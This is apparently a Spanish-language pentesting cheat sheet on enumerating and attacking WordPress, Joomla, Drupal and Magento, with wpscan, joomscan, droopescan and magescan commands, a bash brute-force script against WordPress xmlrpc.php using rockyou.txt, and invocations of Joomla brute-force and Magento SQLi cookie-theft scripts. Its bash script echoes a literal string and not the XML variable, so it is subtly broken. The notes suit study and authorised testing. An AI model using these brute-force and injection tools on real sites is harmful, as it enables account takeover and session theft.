# Wordpress

## Enumeration

>/wp-admin --> Donde puedes iniciar sesión como admin en WP, si este panel de inicio de sesión está expuesto es una vulnerabilidad crítica.

>El mensaje de error en login puede chivarte posibles usernames existentes porque te dirá que x username no existe al probar y si existe te dirá que la contraseña no es correcta pal usuario x existente.
### WPscan

>Uso de wpscan para enumerar usuarios, plugins, temas, etc, en una url que tenga como gestor wordpress:

```bash
wpscan --url http://IP:port
```

>Cosas que se pueden enumerar con wpscan:

```bash
wpscan --url URL -e vp,u --plugins-detection aggressive
```

> Posibles enumeraciones con el parámetro -e:

| Parámetro: | Uso:               |
| ---------- | ------------------ |
| vp         | Vulnerable plugins |
| ap         | All plugins        |
| p          | Popular plugins    |
| vt         | Vulnerable themes  |
| at         | All themes         |
| t          | Popular themes     |
| tt         | Timthumbs          |
| cb         | Config backups     |
| dbe        | Db exports         |
| u          | User IDs range     |
| m          | Media IDs range    |
>Parámetros incompatibles, solo puede usarse uno de los 3:

```bash
vp, ap, p
vt, at, t
```

>Para ver vulnerabilidades:

>Ir a wpscan.com y loguearse
>Ir a la sección profile y obtener el api token
>Usar el api token en las consultas wpscan:

```bash
wpscan --url URL -e vp --api-token="TOKEN"
```

>Ruta donde se encuentran los plugins en un WP:

```
IP:port/wp-content/plugins/
```

>Ver si hay plugins en el codigo fuente:

```bash
curl -s -X GET "http://IP:port" | grep plugins
```

>Verlos más cómodo:

```bash
curl -s -X GET "http://IP:puerto" | grep -oP 'plugins/\K[^/]+' | sort -u
```
## Common exploits

### Fuerza bruta de credenciales

>Creación de un script en bash para realizar fuerza bruta sobre **xmlrpc.php**:

```bash
nano xmlrpc_bruteforce.sh
```

>Usaremos el diccionario rockyou.txt:

```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	exit 1
}

# Ctrl+C
trap ctrl_c SIGINT

function createXML(){
	password=$1

	xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>usuario</value></param>
<param><value>$password</value></param>
</params>
</methodCall>"""

	echo "xmlFile" > file.xml

	response=$(curl -s -X POST "http://IP:puerto/ruta/xmlrpc.php" -d@file.xml)

	if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
		echo -e "\n[+] La contraseña para el usuario usuario es $password"
		exit 0
	fi
}

cat /usr/share/wordlists/rockyou.txt | while read password; do
	createXML $password
done
```

>Uso:

```bash
chmod +x xmlrpc_bruteforce.sh
./xmlrpc_bruteforce.sh
```

### WPscan Brute Force

>Uso de wpscan para hacer fuerza bruta:

```bash
wpscan --url http://IP:puerto -U usuarioAForzar -P diccionario
```

# Joomla

## Enumeration

### Joomscan

#### Instalación

```bash
git clone https://github.com/rezasp/joomscan.git
```
#### Uso

```bash
perl joomscan.pl -u URL
```
## Common exploits

### Brute-Force

>[script](https://github.com/ajnik/joomla-bruteforce)

>Uso:

```
sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 
admin:admin
```
# Drupal

## Enumeration

### Droopescan

#### Instalación:

```bash
git clone https://github.com/SamJoan/droopescan
python3 setup.py install
pip3 install -r requirements.txt
```

#### Uso

```bash
droopescan scan drupal --url http://IP:port
```


## Common exploits

### Un RCE en Drupal:

![image](https://github.com/user-attachments/assets/3eba66b5-5793-4b9d-8759-72998ba4fa4d)

# Magento

## Enumeration

>Herramientas para enumerar magento:

**magescan**

### Instalación magescan

>Hacer un git clone del proyecto.
>Instalar una release de magescan.phar: https://github.com/steverobbins/magescan/releases

### Uso magescan

>Ejecutarlo con php:

```bash
php magescan.phar
```

>Uso para escanear todo el magento de un servidor web, poner la url en la que se encuentre el magento:

```bash
php magescan.phar scan:all http://IP:puerto
```

## Common exploits

### SQLi para obtener cookies de sesión

>Uso de un script python que hace una sqli en la página con magento:

```bash
python3 magento-sqli.py http://IP:port
```

>La vulnerabilidad consiste en que hace fuerza bruta para pillar la cookie de inicio de sesión del administrador, debe estar logueado el admin.
